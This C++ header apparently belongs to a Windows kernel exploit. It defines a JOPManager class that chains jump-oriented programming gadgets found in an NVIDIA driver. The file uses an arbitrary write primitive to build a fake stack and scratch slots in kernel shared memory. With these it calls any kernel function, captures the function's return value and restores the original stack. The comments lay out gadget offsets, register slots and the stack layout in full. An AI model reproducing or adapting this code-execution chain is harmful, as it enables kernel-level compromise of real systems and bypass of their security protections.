#pragma once
#include "general.h"
#include "offsets.h"
#include <vector>
#include <functional>

/*
GADGETS (execution order):
+0x3ea4ec:   pop rdi              ; jmp [rax+0x08]                                              ← entry (GetRip)
+0x0078CB9E: call [rax-0x35C17]  ; jmp [rsi+0x66]                                              ← g1: calls target
+0x000636d07: pop rcx            ; jmp [rdi*9+0xDBB9]                                           ← skip home 1
+0x0003fce5: pop rdi             ; test al,0xFD ; jmp [rsi-0x77]                                ← reload rdi
+0x00ae8360: pop rcx             ; jmp [rsi-0x7F]                                               ← skip home 3
+0x000da4fd2: pop rbx            ; jmp [rsi+0x44]                                               ← skip home 4
+0x006d066a: pop rdx             ; wait ; jmp [rsi-0x39]                                        ← g2: pop rdx
+0x00671319: mov [rdx+0x3E0],rax ; mov rax,[rdx+0x1B0] ; mov rdx,rax ; jmp [rax+0x1C0]         ← g3: save retval
+0x0061cbb5: pop rsp             ; jmp [rax+0x28]                                               ← g4: restore rsp

EXECUTION ORDER (RIP entry = nvidiaBase + 0x3ea4ec = GetRip()):

  ENTRY
+0x3ea4ec:  pop rdi               ; jmp [rax+0x08]           ← GetRip() entry point
              pops rdiForJmp from [RSP=scratchStack+0x30]
              jumps to [rax+0x08] = scratchBase+SCRATCH_G1_JMP = gadget1

  GADGET 1 (g1Off passed to Build)
+0x0078CB9E: call [rax-0x35C17]   ; jmp [rsi+0x66]
              call [rax-0x35C17] = scratchBase+SCRATCH_RAX = call_target
              after return: jmp [rsi+0x66] = scratchBase+0xA5 = pop_rcx_rdi

  POST-CALL CLEANUP (home slot pops)
+0x000636d07: pop rcx             ; jmp [rdi*9+0xDBB9]        ← skips return addr (home slot 1)
              rdi still = rdiForJmp → [rdi*9+0xDBB9] = scratchBase+0x200 = pop_rdi

+0x0003fce5:  pop rdi             ; test al,0xFD ; jmp [rsi-0x77]  ← reloads rdi from stack
              jmp [rsi-0x77] = scratchBase-0x38 = pop_rcx (skip home slot 3)

+0x00ae8360:  pop rcx             ; jmp [rsi-0x7F]             ← skips home slot 3
              jmp [rsi-0x7F] = scratchBase-0x40 = pop_rbx (skip home slot 4)

+0x000da4fd2: pop rbx             ; jmp [rsi+0x44]             ← skips home slot 4
              jmp [rsi+0x44] = scratchBase+0x83 = gadget2

  GADGET 2 (g2Off passed to Build)
+0x006d066a:  pop rdx             ; wait ; jmp [rsi-0x39]
              pops rdx from [RSP+0x58 relative to scratchStack]
              jmp [rsi-0x39] = scratchBase+0x06 = gadget3

  GADGET 3 (g3Off passed to Build)
+0x00671319:  mov [rdx+0x3E0], rax ; mov [rdx+0x3E8], eax ; mov rax, [rdx+0x1B0] ; mov rdx, rax ; jmp [rax+0x1C0]
              saves return value to [rdx+0x3E0] = scratchBase+SCRATCH_RETURN_VAL
              rax = [rdx+0x1B0] = scratchBase+SCRATCH_NEW_RAX (new rax)
              jmp [rax+0x1C0] = scratchBase+SCRATCH_G3_CONT = gadget4

  GADGET 4 (g4Off passed to Build)
+0x0061cbb5:  pop rsp             ; jmp [rax+0x28]
              pops originalRsp from [scratchStack+0x60]
              jmp [rax+0x28] = scratchBase+SCRATCH_G4_CONT = restoreRip


RSI slots (rsi = scratchBase + 0x3F):
  [rsi+0x66] = scratchBase+0xA5  → pop_rcx_rdi (resumes chain after function returns)
  [rsi+0x44] = scratchBase+0x83  → gadget2
  [rsi-0x39] = scratchBase+0x06  → gadget3
  [rsi-0x77] = scratchBase-0x38  → pop_rcx     (skip home slot 3)
  [rsi-0x7F] = scratchBase-0x40  → pop_rbx     (skip home slot 4)

RAX slots (rax = scratchBase+SCRATCH_RAX+0x35C17):
  [rax-0x35C17] = scratchBase+0xB0  → call_target  (SetCallTarget writes here)
  [rax+0x08]    = scratchBase+0x35CCF → gadget1     (entry after setup gadget pops rdi)

RDI dynamic slot:
  [rdi*9+0xDBB9] = scratchBase+0x200 → pop_rdi  (rdi = rdiForJmp, computed via 9^-1 mod 2^64)

Fake stack layout (RSP = scratchStack+0x30, scratchStack = scratchBase+0x41000):
  [scratchStack+0x30] = rdiForJmp     → setup gadget pops into rdi
  [scratchStack+0x38] = home slot 1   → pop_rcx_rdi discards into rcx
  [scratchStack+0x40] = rdiForJmp     → pop_rdi reloads rdi
  [scratchStack+0x48] = home slot 3   → pop_rcx discards
  [scratchStack+0x50] = home slot 4   → pop_rbx discards
  [scratchStack+0x58] = GetRdx()      → gadget2 pops into rdx
  [scratchStack+0x60] = originalRsp   → gadget4 pop rsp restores original kernel stack
*/

#define KUSD_BASE               0xFFFFF78000000000ULL
#define KUSD_SCRATCH_OFF        KUSERSHAREDDATA_SIZE        // 0xa80

#define SCRATCH_RSI_BCK         0x06    // [rsi-0x39] = scratchBase+0x3F-0x39 = scratchBase+0x06
#define SCRATCH_RSI_FWD         0xA5    // [rsi+0x66] = scratchBase+0x3F+0x66 = scratchBase+0xA5
#define SCRATCH_RSI_0x44        0x83    // [rsi+0x44] = scratchBase+0x3F+0x44 = scratchBase+0x83
#define SCRATCH_RSI_0x0F        0x4E    // [rsi+0x0F] = scratchBase+0x3F+0x0F = scratchBase+0x4E
#define SCRATCH_RDI_JMP         0x200   // target for [rdi*9+0xDBB9] — rdi computed in Build()
#define SCRATCH_RAX             0xB0
#define SCRATCH_G1_JMP          0x35CCF  // [rax+0x08] = scratchBase + SCRATCH_RAX + 0x35C17 + 0x08
#define SCRATCH_NEW_RAX         0xC0
#define SCRATCH_G3_CONT         0x280   // 0xC0 + 0x1C0
#define SCRATCH_G4_CONT         0xE8    // 0xC0 + 0x28
// gadget3 saves rax (function return value) to [rdx+0x3E0] = [GetRdx()+0x3E0] = scratchBase+0x2F0
#define SCRATCH_RETURN_VAL      0x2F0
#define SCRATCH_POP_RDX         0xF0    // gadget1 call pushes here; gadget2 pops rdx
#define SCRATCH_ALLOC_START     0x100


#define SCRATCH_STACK_TOP       0x40000
#define SCRATCH_MAX             0x19A000

struct JopSlot {
    const char* name;
    UINT64      addr;
    UINT64      value;
};

class JOPManager {
private:
    std::function<void(UINT64, UINT64)> writeFn;
    std::vector<JopSlot> slots;
    UINT64 allocPtr;

    UINT64 nvidiaBase;
    UINT64 scratchBase;
    UINT64 g1Off; 

    UINT64 rax, rsi, rdx, rdiForJmp;
    UINT64 setupOff; 

    void AddSlot(const char* name, UINT64 scratchOff, UINT64 value);
    UINT64 Alloc(const char* name, UINT64 value);

public:
    JOPManager();
    ~JOPManager() = default;

    void SetWritePrimitive(std::function<void(UINT64, UINT64)> fn);
    void SetNvidiaBase(UINT64 base);
    void SetScratchBase(UINT64 base); 

    void Build(UINT64 g1Off, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off);
    void Commit();
    void SetRestoreRip(UINT64 addr);
    void SetCallTarget(UINT64 addr);
    void SetOriginalRsp(UINT64 originalRsp);
    void SetPostCallRdx(UINT64 postCallRdx);

    UINT64 GetRax() const { return rax; }
    UINT64 GetRsi() const { return rsi; }
    UINT64 GetRdx() const { return rdx; }
    UINT64 GetRdiForJmp() const { return rdiForJmp; } 
    UINT64 GetRip() const { return nvidiaBase + setupOff; }
    UINT64 GetPopRdxValue() const { return rdx; }
    UINT64 GetRspSetupAddr() const { return scratchBase + SCRATCH_STACK_TOP; }
    UINT64 GetReturnValueAddr() const { return scratchBase + SCRATCH_RETURN_VAL; }
    UINT64 GetScratchBase() const { return scratchBase; }

    void PrintLayout() const;
};
